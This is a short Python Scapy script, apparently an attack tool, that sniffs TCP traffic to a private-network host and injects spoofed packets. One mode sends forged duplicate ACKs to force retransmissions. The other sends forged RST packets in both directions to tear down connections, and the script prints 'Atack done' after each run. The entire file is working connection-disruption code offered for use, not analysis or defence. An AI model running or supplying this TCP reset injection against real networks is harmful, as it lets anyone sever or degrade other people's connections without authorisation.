from scapy.all import *

# Define the IP addresses and port numbers for the client and server
src_ip = '192.168.0.127'
dst_ip = '192.168.0.167'

# Define the packet filter to capture incoming TCP packets
filter = 'tcp and host {}'.format(dst_ip)

# Define the packet handling function for delayed packets
def delay_packet(packet):
    # Send 3 ACK packets to force retransmission
    for i in range(3):
        send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="A", seq=packet[TCP].seq, ack=packet[TCP].ack+1))

# Define the packet handling function for reset packets
def reset_packet(packet):
    # Send a TCP RST packet to drop the connection
    send(IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq,flags='R'), verbose=False)
    send(IP(dst=packet[IP].dst, src=packet[IP].src)/TCP(dport=packet[TCP].dport, sport=packet[TCP].sport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags='R'), verbose=False)    


if __name__=="__main__":
    # Wait for user input on the desired throttling mode
    while True:
        mode = input('Enter "delay" for delayed packets or "reset" for reset packets: ')

        # Handle delayed packets
        if mode == 'delay':
            print('Delaying packets...')
            sniff(filter=filter, count=100000, prn=delay_packet)
            print('Atack done')

        # Handle reset packets
        elif mode == 'reset':
            print('Resetting packets...')
            sniff(filter=filter, count=1000, prn=reset_packet)
            print('Atack done')


        # Handle invalid input
        else:
            print('Invalid input. Please enter "delay" or "reset".')
